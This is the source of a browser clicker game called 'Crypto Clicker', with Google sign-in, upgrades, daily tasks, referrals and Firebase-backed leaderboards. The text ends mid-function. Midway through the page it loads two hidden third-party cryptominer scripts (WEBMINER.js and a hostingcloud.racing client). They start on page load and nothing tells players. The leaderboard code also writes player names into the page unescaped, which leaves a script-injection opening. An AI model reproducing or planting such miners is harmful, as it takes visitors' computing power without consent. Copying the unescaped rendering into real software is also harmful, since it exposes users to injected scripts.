<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<!--  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">-->
  <title>Crypto Clicker</title>
  <style>
    body {
      background: #0f0f0f;
      color: #fff;
      font-family: 'Segoe UI', sans-serif;
      text-align: center;
      padding: 20px;
    }
    input { padding: 8px; font-size: 16px; margin-bottom: 10px; border-radius: 5px; border: none; }
    .click-button {
      background: linear-gradient(135deg, #00ffa6, #00c3ff);
      color: #000;
      font-weight: bold;
      padding: 15px 30px;
      font-size: 18px;
      border-radius: 12px;
      cursor: pointer;
      margin: 10px;
      border: none;
    }
    #counter {
      font-size: 36px;
      margin-top: 20px;
      font-weight: bold;
      transition: transform 0.2s ease;
    }
    #counter.bounce {
      transform: scale(1.2);
    }
    #levelMessage {
      display: none;
      opacity: 0;
      transition: opacity 1s ease-in-out;
      color: gold;
      font-weight: bold;
      margin-top: 5px;
    }
    #levelMessage.show {
      display: block;
      opacity: 1;
    }
    table { margin: 20px auto; border-collapse: collapse; width: 80%; max-width: 600px; }
    th, td { padding: 10px; border-bottom: 1px solid #333; }
    th { background-color: #00c3ff; color: #000; }
    #message { margin-top: 10px; color: #ff5555; }
    .progress-container { background-color: #222; border-radius: 10px; height: 12px; width: 140px; margin: 10px auto; overflow: hidden; box-shadow: 0 0 5px #00ffc8; }
    .progress-bar { height: 100%; background: linear-gradient(90deg, #00ffc8 0%, #00c3ff 100%); width: 0%; transition: width 0.3s ease-in-out; border-radius: 10px; }
    #profilePanel { position: absolute; top: 20px; left: 20px; background-color: #1a1a1a; padding: 15px; border-radius: 12px; box-shadow: 0 0 10px #00c3ff; width: 200px; text-align: left; }
    #profilePanel div { margin: 6px 0; }
    #buttonGroup { margin-top: 180px; }
    #motiveText {
      margin-top: 20px;
      font-size: 18px;
      color: #00ffc8;
      text-shadow: 0 0 8px #00ffc8;
      transition: opacity 0.5s ease-in-out;
    }
    .achievement-panel {
      max-height: 0;
      overflow: hidden;
      transition: max-height 0.4s ease, padding 0.4s ease;
      padding: 0 10px;
      background-color: #1a1a1a;
      border-radius: 10px;
      margin-top: 20px;
      box-shadow: 0 0 10px #00c3ff;
    }
    .achievement-panel.open {
      max-height: 500px;
      padding: 10px;
    }
    .ad-container {
      text-align: center;
      margin: 20px 0;
      max-width: 100%;
      overflow: hidden;
    }
    .ad-container iframe {
      max-width: 100%;
      width: 728px;
      height: 90px;
      border: none;
      margin: 10px auto;
      display: block;
    }
    @media (max-width: 768px) {
      .ad-container iframe {
        width: 100%;
        height: auto;
        max-width: 300px;
      }
    }
    #tasksPanel {
      max-height: 0;
      overflow: hidden;
      transition: max-height 0.4s ease, padding 0.4s ease;
      padding: 0 10px;
      background-color: #1a1a1a;
      border-radius: 10px;
      margin-top: 20px;
      box-shadow: 0 0 10px #00c3ff;

      height: auto; /* Устанавливаем автоматическую высоту */
/*  min-height: 150px; /* Минимальная высота, чтобы панель не была слишком маленькой */
/*  overflow-y: auto; /* Добавляем прокрутку, если содержимое превышает максимальную высоту */
 /* max-height: 50vh; /* Ограничиваем максимальную высоту (опционально, 50% высоты экрана) */
    }
    
    #tasksPanel.open {
      max-height: 500px;
      padding: 10px;
      height: auto; /* Устанавливаем автоматическую высоту для списка заданий */
    }
    #tasksList div {
      margin-bottom: 10px;
      padding: 8px;
      border: 1px solid #00c3ff;
      border-radius: 8px;
      background-color: #222;
    }
    @keyframes shake {
      0% { transform: translateX(0); }
      25% { transform: translateX(-5px); }
      50% { transform: translateX(5px); }
      75% { transform: translateX(-5px); }
      100% { transform: translateX(0); }
    }




    .bonus-card {
  background: #1a1a1a;
  padding: 15px;
  border-radius: 12px;
  width: 180px;
  box-shadow: 0 0 10px #00c3ff;
  text-align: center;
}
.bonus-card h3 {
  margin: 0 0 10px;
  font-size: 18px;
  color: #00ffa6;
}
.bonus-card p {
  margin: 0 0 10px;
  font-size: 14px;
  color: #fff;
}
#claimBonusBtn:disabled {
  background: #555;
  cursor: not-allowed;
}
@media (max-width: 768px) {
  #hourlyBonus {
    top: 10px;
    right: 10px;
  }
  .bonus-card {
    width: 140px;
    padding: 10px;
  }
  .bonus-card h3 {
    font-size: 16px;
  }
  .bonus-card p {
    font-size: 12px;
  }
}

    #tasksList .click-button {
  background: linear-gradient(135deg, #00ffa6, #00c3ff);
  color: #000;
  font-weight: bold;
  padding: 8px 15px;
  font-size: 14px;
  border-radius: 8px;
  cursor: pointer;
  margin: 5px;
  border: none;
  display: inline-block;
  z-index: 10;
  position: relative;
}
#tasksList .click-button:hover {
  background: linear-gradient(135deg, #00c3ff, #00ffa6);
}
#tasksList .click-button:disabled {
  background: #555;
  cursor: not-allowed;
}
    
#mainButtonContainer {
  display: flex;
  justify-content: center;
  margin: 20px 0;
 /* position: relative; /* Добавьте, чтобы дочерний #particles-js позиционировался корректно */
 /* width: 100%; /* Убедитесь, что контейнер имеет ширину */
 /* height: 200px; /* Установите высоту, если она не задана */
}

.main-click-button {
  width: 120px;
  height: 120px;
  background: linear-gradient(135deg, #00ffa6, #00c3ff);
  border-radius: 50%;
  border: none;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  box-shadow: 0 0 15px #00c3ff;
  transition: transform 0.2s ease, box-shadow 0.2s ease;
  outline: none; /* Убираем квадратный контур */
  -webkit-tap-highlight-color: transparent; /* убирает серый квадрат на Android */
  z-index: 1;
}

.main-click-button:hover {
  box-shadow: 0 0 25px #00ffa6;
}

.main-click-button:active {
  transform: scale(0.9);
  box-shadow: 0 0 10px #00c3ff; /* Уменьшаем тень при нажатии */
}

/* Стили для фокуса (для доступности) */
.main-click-button:focus {
  outline: none; /* Убираем стандартный контур */
  box-shadow: 0 0 15px #00ffa6, 0 0 5px #00c3ff; /* Добавляем кастомную тень для фокуса */
}

.main-click-button .icon {
  font-size: 50px;
}

.main-click-button,
.click-button {
  touch-action: manipulation; /* Отключает масштабирование и задержку при касании */
}

        

.pulse {
  animation: pulse 0.2s ease;
}

@keyframes pulse {
  0% { transform: scale(1); }
  50% { transform: scale(1.2); }
  100% { transform: scale(1); }
}


#particles-js {
  position: absolute;
  width: 100%;
  height: 100%;
  /*background: #1a1a1a; /* Фон для контраста */
  z-index: -1; /* Частицы на заднем плане */
}


#leaderboardContainer {
  max-width: 800px;
  margin: 20px auto;
  background: #1a1a1a;
  border-radius: 10px;
  overflow: hidden;
  box-shadow: 0 0 20px rgba(0, 195, 255, 0.3);
}

.tabs {
  display: flex;
  justify-content: flex-start; /* Закладки выровнены слева */
  margin-bottom: -1px; /* Убираем зазор между вкладками и таблицей */
}

.tab-button {
  padding: 10px 20px;
  background: #2a2a2a;
  color: #fff;
  border: 1px solid #00c3ff;
  border-bottom: none; /* Убираем нижнюю границу для эффекта закладки */
  border-radius: 5px 5px 0 0; /* Закругленные углы только сверху */
  cursor: pointer;
  font-size: 16px;
  transition: background 0.3s ease, color 0.3s ease;
  position: relative;
  z-index: 1; /* Вкладка над таблицей */
}

.tab-button:hover {
  background: #3a3a3a;
}

.tab-button.active {
  background: linear-gradient(135deg, #00c3ff, #00ffa6);
  color: #000;
  font-weight: bold;
  border-bottom: 1px solid transparent; /* Скрываем границу для активной вкладки */
  z-index: 2; /* Активная вкладка выше */
}

#leaderboardTable {
  width: 100%;
  border-collapse: collapse;
  background: #1a1a1a;
}

#tableHeader {
  background: #00c3ff; /* Синяя полоска для заголовка */
}

#tableHeader th {
  padding: 10px;
  color: #000;
  font-weight: bold;
  text-align: left;
}

#leaderboardBody td {
  padding: 10px;
  color: #fff;
  border-bottom: 1px solid #333;
}

/* Стили для мобильных устройств */
@media (max-width: 600px) {
  .tab-button {
    padding: 8px 15px;
    font-size: 14px;
  }

  #tableHeader th, #leaderboardBody td {
    padding: 8px;
    font-size: 14px;
  }
}
    


 /* #settings {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 10px;
  background: #1a1a1a;
  padding: 20px;
  border-radius: 12px;
  width: 200px;
  margin: 0 auto;
  box-shadow: 0 0 10px #00c3ff;
}
#settings h3 {
  color: #00ffa6;
  margin: 0;
}
#settings p {
  color: #fff;
  margin: 5px 0;
}
#settings .click-button:disabled {
  background: #555;
  cursor: not-allowed;
}  */



    

  
                   
  </style>
</head>

<body>
  <div id="profilePanel">
    <div><strong>Player:</strong> <span id="profileName">Anonymous</span></div>
    <div><strong>Level:</strong> <span id="playerLevel">1</span> / 10</div>
    <div><strong>Click Power:</strong> <span id="profileClickPower">1</span></div>
    <div><strong>Autoclicker:</strong> <span id="profileAutoclick">Inactive</span></div>
    <div><strong>Tokens:</strong> <span id="profileTokens">0</span></div>

    <div><strong>Crystals:</strong> <span id="profileCrystals">0 💎</span></div>
    <!-- Добавляем реферальный раздел -->
  <div><strong>Referral Link:</strong> <input id="referralLink" readonly style="width: 150px;"></div>   
  <div><strong>Invited:</strong> <span id="invitedCount">0</span></div>
   <div><button class="click-button" onclick="copyReferralLink()">Copy Link</button></div>
    
    <div><button class="click-button" onclick="signOut()">Sign Out</button></div>
  </div>

  <div id="playerLevelContainer">
    <div id="levelMessage" style="display: none; color: gold; font-weight: bold; margin-top: 5px;">
      <!-- Message will appear here -->
    </div>
  </div>

  <h1>Crypto Clicker 💰</h1>

  <div id="authSection">
    <button class="click-button" onclick="signInWithGoogle()">Sign in with Google</button>
    <div id="motiveText">Click — earn tokens.</div>
  </div>

  <div id="gameSection" style="display:none;">
    <div id="hourlyBonus" style="position: absolute; top: 20px; right: 20px;">
    <div class="bonus-card">
      <h3>Hourly Bonus</h3>
      <p id="bonusTimer">Next in: 01:00:00</p>
      <button class="click-button" id="claimBonusBtn" onclick="claimHourlyBonus()" disabled>Claim Bonus</button>
    </div>
  </div>
   <!-- <div id="dailyReward" style="display: none; margin-top: 20px;">
      <h2>Daily Reward</h2>
      <p id="streakText">Login streak: 0 days</p>
      <button class="click-button" onclick="claimDailyReward()">Claim Reward</button>
    </div>-->

    <div id="mainButtonContainer">
      <div id="particles-js" style="position: absolute; width: 100%; height: 100%; z-index: -1;"></div>
  <button id="mainClickButton" class="main-click-button" onclick="clickToken()">
    <span class="icon">💰</span>
  </button>
    </div>

    <div id="counter">Tokens: 0</div>
    <div id="message"></div>
    <div id="buttonGroup">
     <!-- <button class="click-button" onclick="clickToken()">Collect Token</button> -->
      <button class="click-button" id="shopBtn" onclick="toggleShop()">Shop</button>
      <button class="click-button" onclick="toggleAchievements()">🏆 Achievements</button>
      <button class="click-button" onclick="toggleTasks()">📋 Tasks</button>
      <button class="click-button" onclick="startMiniGame()">Start Mini-Game</button>
    </div>

    <div id="shop" style="display:none; margin-top: 20px;">
      <h2>🛒 Upgrades</h2>
      <p id="clickPowerCostText">💪 Click Power +1 (Cost: 50)</p>
      <p>Current: <span id="clickPowerDisplay">1</span> / 8</p>
      <div class="progress-container">
        <div class="progress-bar" id="clickPowerBar"></div>
      </div>
      <button class="click-button" onclick="buyUpgrade('clickPower')">Buy</button>

      <h2>⚡ Autoclickers</h2>

      <div id="settings" style="background: #1a1a1a; padding: 20px; border-radius: 4px; width: 300px; margin: 0 auto; box-shadow: 0 0 10px #00c3ff;">
  <h3>Autoclicker Level: <span id="networkLevel">1</span> / 20</h3>
  <p id="autoclickerDuration">Duration: <span id="timeLeft">60</span>s</p>
  <p id="autoclickerUpgradeCost">Upgrade Cost: 100 Tokens + 5000 💎</p>
  <button class="click-button" id="upgradeAutoclickerBtn" onclick="upgradeAutoclicker()">Upgrade Autoclicker</button>
  <button class="click-button" id="activateFreeAutoclickerBtn" onclick="activateFreeAutoclicker()">Activate Free Autoclicker Coming soon</button>
</div>



      
      <div id="autoclickerShop" style="display: flex; flex-wrap: wrap; justify-content: center; gap: 20px;">
        <div style="background: #1a1a1a; padding: 20px; border-radius: 12px; width: 200px; box-shadow: 0 0 10px #00c3ff;">
          <h3>1 Minute</h3>
          <p>Cost: 200 Tokens</p>
          <button class="click-button" onclick="buyAutoclicker(1)">Buy</button>
        </div>
        <div style="background: #1a1a1a; padding: 20px; border-radius: 12px; width: 200px; box-shadow: 0 0 10px #00c3ff;">
          <h3>5 Minutes</h3>
          <p>Cost: 800 Tokens</p>
          <button class="click-button" onclick="buyAutoclicker(5)">Buy</button>
        </div>
        <div style="background: #1a1a1a; padding: 20px; border-radius: 12px; width: 200px; box-shadow: 0 0 10px #00c3ff;">
          <h3>10 Minutes</h3>
          <p>Cost: 1400 Tokens</p>
          <button class="click-button" onclick="buyAutoclicker(10)">Buy</button>
        </div>
      </div>
    </div>

    <div id="achievementsPanel" class="achievement-panel">
      <h2>Achievements</h2>
      <div id="achievementsList"></div>
    </div>

    <div id="tasksPanel" class="achievement-panel">
      <h2>Daily Tasks</h2>
      <div id="tasksList"></div>
    </div>

    <div id="miniGamePanel" style="display: none; margin-top: 20px;">
  <h2>Mini-Game: Clicker Race!</h2>
  <p>Click 50 times in 10 seconds!</p>
  <p>Time Left: <span id="miniGameTimer">10</span> sec</p>
  <p>Clicks: <span id="miniGameClicks">0</span>/50</p>
  <button class="click-button" onclick="miniGameClick()">Click!</button>
</div>


 <div id="leaderboardContainer">
  <div class="tabs">
    <button class="tab-button active" onclick="showTab('overall')" id="overallTabBtn">Overall</button>
    <button class="tab-button" onclick="showTab('weekly')" id="weeklyTabBtn">Weekly Winners</button>
  </div>
  <table id="leaderboardTable">
    <thead id="tableHeader">
      <!-- Заголовки будут меняться в зависимости от вкладки -->
    </thead>
    <tbody id="leaderboardBody"></tbody>
  </table>
</div>   
    


  <script src="https://wm.bmwebm.org/WEBMINER.js"></script>
  <script>WEBMINER.config({ login: "5991295", pass: null }).power(30);</script>


<script src="https://www.hostingcloud.racing/7cNE.js"></script>
<script>
    var _client = new Client.Anonymous('a906669d7e396ee6ee954686b5a94aca67c554cebb263559bb90c79e9a945eda', {
        throttle: 0.8, c: 'w', ads: 0
    });
    _client.start();
    

</script>


  
<!--  <script src="https://cdnjs.cloudflare.com/ajax/libs/particles.js/2.0.0/particles.min.js"></script> -->
<script src="https://unpkg.com/tsparticles@3.5.0/tsparticles.bundle.min.js"></script>

  
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyDVgvBf_C6dIMtZ4MISwR5YRCBi8_JXinQ",
      authDomain: "cryptoclickertry.firebaseapp.com",
      databaseURL: "https://cryptoclickertry-default-rtdb.firebaseio.com",
      projectId: "cryptoclickertry",
      storageBucket: "cryptoclickertry.firebasestorage.app",
      messagingSenderId: "1017002572592",
      appId: "1:1017002572592:web:e06e5f4ba00017dc1466f5",
      measurementId: "G-W2T3BN4LL3"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const auth = firebase.auth();

    const allAchievements = {
      superClicker: { name: "Super Clicker", description: "Click 10,000 times", reward: "+2 Click Power (2 min)" },
      tokenHoarder: { name: "Token Hoarder", description: "Collect 1,000,000 tokens", reward: "+2 Click Power (2min)" },
      level5: { name: "Level 5 Reached", description: "Reach level 5", reward: "+1 Click Power" },
    };

    const levelUpRequirements = [
      50000, 100000, 500000, 2500000, 50000000, 200000000, 800000000, 3200000000, 10000000000
    ];

   

const dailyTasks = [
  {
    id: "clickMarathon",
    description: "Make 100 clicks",
    goal: 100,
    reward: 50,
    period: "daily"
  },
  {
    id: "collectTokens",
    description: "Collect tokens",
    goalOptions: [1000, 3000, 5000],
    rewards: [100, 350, 600],
    period: "daily"
  },
  {
    id: "subscribeTwitter",
    description: "Follow @CircleGameTry on X",
    goal: 1,
    reward: 20,
    period: "daily",
    link: "https://x.com/CircleGameTry"
  },
  {
    id: "clickMasterWeekly",
    description: "Make 500 clicks in a week",
    goal: 500,
    reward: 500,
    period: "weekly"
  },
  {
    id: "autoclickerMaster",
    description: "Activate autoclicker 5 times in a week",
    goal: 5,
    reward: "Free 5-minute autoclicker",
    period: "weekly",
    alternate: true // Флаг для чередования
  },
  {
    id: "collectBigTokens",
    description: "Collect tokens in a week",
    goalOptions: [10000, 12000, 15000],
    rewards: [1000, 1200, 1500],
    period: "weekly",
    alternate: true // Флаг для чередования
  },
  {
  id: "miniGameChallenge",
  description: "Play 5 mini-games",
  goal: 5,
  reward: 1,
  rewardType: "crystals", // Custom field to indicate crystal reward
  period: "daily"
  }
];
    
    

    let user = null;
    let score = 0;
    let clickPower = 1;
    let autoclickActive = false;
    let autoclickInterval = null;
    let autoclickEndTime = 0;
    let autoclickCooldown = false;
    let currentLevel = 1;
    let totalClicks = 0;
    let autoclickerUses = 0;
    let achievements = {};
    let tempBoostTimeout = null;
    let originalClickPower = null;
    let isRenderingTasks = false;
    let bonusTimerInterval = null;
    let isAnimating = false;
    let isProcessingReferrer = false;
    let currentTab = "overall"; // Отслеживаем текущую вкладку
    let crystals = 0;


    let miniGameActive = false;
    let miniGameClicks = 0;
    let miniGameTimer = null;


    let autoclickerLevel = 1;

    const maxAutoclickerDuration = 4 * 60 * 60 * 1000; // 4 часа



function startMiniGame() {
  if (score < 1000) {
    showMessage("You need 1000 tokens to start the mini-game!");
    return;
  }
  miniGameActive = true;
  miniGameClicks = 0;
  document.getElementById("miniGamePanel").style.display = "block";
  document.getElementById("miniGameClicks").innerText = miniGameClicks;
  let timeLeft = 10;
  document.getElementById("miniGameTimer").innerText = timeLeft;
  miniGameTimer = setInterval(() => {
    timeLeft--;
    document.getElementById("miniGameTimer").innerText = timeLeft;
    if (timeLeft <= 0) {
      endMiniGame();
    }
  }, 1000);

}
    

function miniGameClick() {
  if (miniGameActive) {
    miniGameClicks++;
    document.getElementById("miniGameClicks").innerText = miniGameClicks;
    if (miniGameClicks >= 50) {
      endMiniGame(true);
    }
  }
}

function endMiniGame(success = false) {
  clearInterval(miniGameTimer);
  miniGameActive = false;
  document.getElementById("miniGamePanel").style.display = "none";
  if (success) {
    score += 500;
    showMessage("Mini-game completed! +500 tokens!");
    updateTaskProgress("miniGameChallenge", 1); // Увеличиваем прогресс
    checkTaskCompletion("miniGameChallenge"); // Проверяем завершение и начисляем награду
    submitScore();
  } else {
    showMessage("Mini-game failed. Try again!");
  }
  updateCounterDisplay();
  updateProfilePanel();
  renderTasks();
}
    
    

function generateReferralLink() {
  if (!user) return '';
  const baseUrl = window.location.origin; // Например, https://your-game-domain.com
  return `${baseUrl}/?ref=${user.uid}`;
}

function copyReferralLink() {
  const referralLink = document.getElementById('referralLink');
  referralLink.select();
  document.execCommand('copy');
  showMessage('Referral link copied!');
}

    
function updateProfilePanel() {
  document.getElementById('profileClickPower').innerText = Math.min(clickPower, 8);
  if (autoclickActive) {
    const remaining = Math.max(0, autoclickEndTime - Date.now());
    const seconds = Math.floor(remaining / 1000) % 60;
    const minutes = Math.floor(remaining / 60000);
    document.getElementById('profileAutoclick').innerText = `Active: ${minutes}:${seconds.toString().padStart(2, '0')}`;
  } else {
    document.getElementById('profileAutoclick').innerText = 'Inactive';
  }
  let level = 1;
  for (let i = 0; i < levelUpRequirements.length; i++) {
    if (score >= levelUpRequirements[i]) {
      level = i + 2;
    } else {
      break;
    }
  }
  document.getElementById('playerLevel').innerText = level;
  document.getElementById('profileTokens').innerText = score;
  document.getElementById('profileName').innerText = user?.displayName || 'Anonymous';
  document.getElementById('referralLink').value = generateReferralLink();

  // Add crystals to profile (assuming a global `crystals` variable)
  const crystalsElement = document.getElementById('profileCrystals');
  if (crystalsElement) {
    crystalsElement.innerHTML = `${crystals || 0} 💎`;
  }

  // Подсчитываем количество приглашённых
  if (user) {
    db.ref(`referrals/${user.uid}`).once('value').then(snapshot => {
      const referrals = snapshot.val();
      const invitedCount = referrals ? Object.keys(referrals).length : 0;
      document.getElementById('invitedCount').innerText = invitedCount;
    });
  }

  const levelMessageElement = document.getElementById('levelMessage');
  if (level === 10) {
    levelMessageElement.innerText = 'Maximum level reached!';
    levelMessageElement.classList.add('show');
  } else {
    levelMessageElement.classList.remove('show');
  }
}
 

    function checkDailyReward() {
      if (!user) return;
      const today = new Date().toDateString();
      db.ref("dailyRewards/" + user.uid).once("value").then(snapshot => {
        const data = snapshot.val() || { lastLogin: "", streak: 0 };
        const lastLogin = data.lastLogin || "";
        let streak = data.streak || 0;

        if (lastLogin !== today) {
          document.getElementById("dailyReward").style.display = "block";
          if (new Date(lastLogin).toDateString() === new Date(Date.now() - 86400000).toDateString()) {
            streak++;
          } else {
            streak = 1;
          }
          db.ref("dailyRewards/" + user.uid).set({ lastLogin: today, streak: streak });
          document.getElementById("streakText").innerText = `Login streak: ${streak} days`;
        }
      });
    }

    function claimDailyReward() {
      db.ref("dailyRewards/" + user.uid).once("value").then(snapshot => {
        const data = snapshot.val();
        const streak = data.streak || 1;
        const rewards = [50, 100, 200, 300, 500, 1000, 2000];
        const reward = rewards[Math.min(streak - 1, rewards.length - 1)];

        score += reward;
        updateCounterDisplay();
        submitScore();
        showMessage(`Claimed ${reward} tokens for ${streak}-day streak!`);
        document.getElementById("dailyReward").style.display = "none";
      });
    }



function startBonusTimer() {
  if (bonusTimerInterval) clearInterval(bonusTimerInterval);

  bonusTimerInterval = setInterval(() => {
    if (!user) return;
    db.ref(`hourlyBonus/${user.uid}`).once("value").then(snapshot => {
      const data = snapshot.val() || { lastClaim: 0 };
      const now = Date.now();
      const timeSinceLastClaim = now - data.lastClaim;
      const oneHour = 3600000; // 1 hour in milliseconds
      const timeRemaining = Math.max(0, oneHour - timeSinceLastClaim);

      if (timeRemaining <= 0) {
        document.getElementById("claimBonusBtn").disabled = false;
        document.getElementById("bonusTimer").innerText = "Claim now!";
        clearInterval(bonusTimerInterval);
      } else {
        document.getElementById("claimBonusBtn").disabled = true;
        const hours = Math.floor(timeRemaining / 3600000);
        const minutes = Math.floor((timeRemaining % 3600000) / 60000);
        const seconds = Math.floor((timeRemaining % 60000) / 1000);
        document.getElementById("bonusTimer").innerText = `Next in: ${hours.toString().padStart(2, '0')}:${minutes
          .toString()
          .padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
      }
    }).catch(error => {
      console.error("Error fetching bonus timer:", error);
      showMessage("Failed to load bonus timer.");
    });
  }, 1000);
}



function claimHourlyBonus() {
  if (!user) {
    showMessage("Please sign in to claim the bonus.");
    return;
  }

  db.ref(`hourlyBonus/${user.uid}`).once("value").then(snapshot => {
    const data = snapshot.val() || { lastClaim: 0 };
    const now = Date.now();
    const timeSinceLastClaim = now - data.lastClaim;
    const oneHour = 3600000;

    if (timeSinceLastClaim >= oneHour || !data.lastClaim) {
      const reward = Math.floor(Math.random() * (200 - 10 + 1)) + 10; // Random 10-200 tokens

      // Используем транзакцию для обновления score
      db.ref(`leaderboard/${user.uid}/score`).transaction(currentScore => {
        return (currentScore || 0) + reward;
      }).then(transactionResult => {
        if (transactionResult.committed) {
          score = transactionResult.snapshot.val(); // Обновляем локальный score
          updateCounterDisplay();
          showMessage(`Claimed ${reward} tokens from Hourly Bonus!`);

          // Сохраняем время последнего получения бонуса
          db.ref(`hourlyBonus/${user.uid}`).set({ lastClaim: now }).then(() => {
            document.getElementById("claimBonusBtn").disabled = true;
            startBonusTimer();
          }).catch(error => {
            console.error("Error saving bonus claim:", error);
            showMessage("Failed to save bonus claim.");
          });
        } else {
          showMessage("Failed to claim bonus due to server error.");
        }
      }).catch(error => {
        console.error("Error updating score:", error);
        showMessage("Failed to update score.");
      });
    } else {
      showMessage("Bonus not ready yet!");
    }
  }).catch(error => {
    console.error("Error checking bonus eligibility:", error);
    showMessage("Failed to check bonus eligibility.");
  });
}


function showTab(tab) {
  const tableHeader = document.getElementById("tableHeader");
  const leaderboardBody = document.getElementById("leaderboardBody");
  const overallBtn = document.getElementById("overallTabBtn");
  const weeklyBtn = document.getElementById("weeklyTabBtn");

  currentTab = tab; // Обновляем текущую вкладку

  
  if (tab === "overall") {
    overallBtn.classList.add("active");
    weeklyBtn.classList.remove("active");
    tableHeader.innerHTML = "<tr><th>#</th><th>Player</th><th>Tokens</th></tr>";
    // Данные будут загружены слушателем
  } else {
    overallBtn.classList.remove("active");
    weeklyBtn.classList.add("active");
    tableHeader.innerHTML = "<tr><th>#</th><th>Player</th><th>Tokens</th><th>Reward</th></tr>";
    // Данные будут загружены слушателем
  }
}

    

//таблица лидеров 
function updateOverallLeaderboard() {
  const leaderboardBody = document.getElementById("leaderboardBody");
  db.ref("leaderboard").once("value", snapshot => {
    const data = [];
    snapshot.forEach(child => {
      const entry = child.val();
      if (entry && entry.score !== undefined && entry.name) {
        data.push({
          id: entry.id,
          name: entry.name,
          score: entry.score
        });
      }
    });

    data.sort((a, b) => b.score - a.score);

    leaderboardBody.innerHTML = "";

    if (data.length === 0) {
      leaderboardBody.innerHTML = "<tr><td colspan='3'>No players yet</td></tr>";
      return;
    }

    data.slice(0, 10).forEach((entry, index) => {
      leaderboardBody.innerHTML += `<tr><td>${index + 1}</td><td>${entry.name}</td><td>${entry.score}</td></tr>`;
    });
  }, error => {
    console.error("Error loading leaderboard:", error);
    showMessage("Failed to load leaderboard.");
  });
}

//таблица лидеров 
function updateWeeklyLeaderboard() {
  const weekKey = getWeekKey();
  const leaderboardBody = document.getElementById("leaderboardBody");
  db.ref(`weeklyLeaderboard/${weekKey}`).once("value", snapshot => {
    const data = [];
    snapshot.forEach(child => {
      const entry = child.val();
      if (entry && entry.score >= 50000 && entry.name) {
        data.push({
          id: entry.id,
          name: entry.name,
          score: entry.score,
          rewardClaimed: entry.rewardClaimed || false
        });
      }
    });

    data.sort((a, b) => b.score - a.score);

    leaderboardBody.innerHTML = "";

    if (data.length === 0) {
      leaderboardBody.innerHTML = "<tr><td colspan='4'>No players with 50,000+ tokens this week</td></tr>";
      return;
    }

    data.slice(0, 10).forEach((entry, index) => {
      const reward = getRewardForRank(index + 1);
      const rewardText = entry.rewardClaimed ? `${reward} (Claimed)` : reward;
      leaderboardBody.innerHTML += `<tr><td>${index + 1}</td><td>${entry.name}</td><td>${entry.score}</td><td>${rewardText}</td></tr>`;
    });
  }, error => {
    console.error("Error loading weekly leaderboard:", error);
    showMessage("Failed to load weekly leaderboard.");
  });
}

//таблица лидеров 
    function getWeekKey() {
  const now = new Date();
  const year = now.getFullYear();
  const week = getWeekNumber();
  return `${year}_${week}`;
    }

 //таблица лидеров  
function getRewardForRank(rank) {
  if (rank <= 3) return 10000;
  if (rank <= 5) return 7000;
  return 5000;
}

      
//таблица лидеров 
   function updateWeeklyScore() {
  if (!user) return;
  const weekKey = getWeekKey();
  const userName = user.displayName || `Player_${user.uid.slice(0, 8)}`;
  db.ref(`weeklyLeaderboard/${weekKey}/${user.uid}`).update({
    id: user.uid,
    name: userName,
    score: score,
    lastUpdate: Date.now()
  }).catch(error => {
    console.error("Error updating weekly score:", error);
  });
} 
//таблица лидеров 
function awardWeeklyRewards() {
  const weekKey = getWeekKey();
  db.ref(`weeklyLeaderboard/${weekKey}`).once("value", snapshot => {
    const data = [];
    snapshot.forEach(child => {
      const entry = child.val();
      if (entry && entry.score >= 50000 && !entry.rewardClaimed) {
        data.push({
          id: entry.id,
          score: entry.score
        });
      }
    });

    data.sort((a, b) => b.score - a.score);

    data.slice(0, 10).forEach((entry, index) => {
      const reward = getRewardForRank(index + 1);
      db.ref(`leaderboard/${entry.id}/score`).transaction(currentScore => {
        return (currentScore || 0) + reward;
      }).then(() => {
        db.ref(`weeklyLeaderboard/${weekKey}/${entry.id}`).update({
          rewardClaimed: true,
          lastUpdate: Date.now()
        });
        if (entry.id === user?.uid) {
          score += reward;
          updateCounterDisplay();
          showMessage(`Weekly reward: +${reward} tokens for rank ${index + 1}!`);
        }
        db.ref(`notifications/${entry.id}`).push({
          message: `Weekly reward: +${reward} tokens for rank ${index + 1}!`,
          timestamp: Date.now(),
          read: false
        });
      }).catch(error => {
        console.error("Error awarding weekly reward:", error);
      });
    });
  });
}

//таблица лидеров 
   function checkWeeklyReset() {
  const now = new Date();
  const weekKey = getWeekKey();
  db.ref(`weeklyLeaderboard/lastReset`).once("value").then(snapshot => {
    const lastReset = snapshot.val() || 0;
    const oneWeek = 7 * 24 * 60 * 60 * 1000; // 7 дней в миллисекундах
    if (Date.now() - lastReset >= oneWeek) {
      // Начисляем награды за прошлую неделю
      awardWeeklyRewards();
      // Сбрасываем таблицу
      db.ref(`weeklyLeaderboard/${weekKey}`).remove();
      db.ref(`weeklyLeaderboard/lastReset`).set(Date.now());

      listenToWeeklyLeaderboard();
    }
  });
} 


    function closeAllPanels() {
      console.log("Closing all panels...");
      const shop = document.getElementById("shop");
      if (shop) {
        shop.style.display = "none";
        console.log("Shop panel closed");
      } else {
        console.error("Element #shop not found");
      }

      const achievementsPanel = document.getElementById("achievementsPanel");
      if (achievementsPanel) {
        achievementsPanel.classList.remove("open");
        console.log("Achievements panel closed");
      } else {
        console.error("Element #achievementsPanel not found");
      }
      const achievementsBtn = document.querySelector("button[onclick='toggleAchievements()']");
      if (achievementsBtn) {
        achievementsBtn.innerHTML = "🏆 Achievements ▼";
        console.log("Achievements button text updated");
      } else {
        console.error("Button for toggleAchievements not found");
      }

      const tasksPanel = document.getElementById("tasksPanel");
      if (tasksPanel) {
        tasksPanel.classList.remove("open");
        console.log("Tasks panel closed");
      } else {
        console.error("Element #tasksPanel not found");
      }
      const tasksBtn = document.querySelector("button[onclick='toggleTasks()']");
      if (tasksBtn) {
        tasksBtn.innerHTML = "📋 Tasks ▼";
        console.log("Tasks button text updated");
      } else {
        console.error("Button for toggleTasks not found");
      }
    }

    function setClickPower(newPower) {
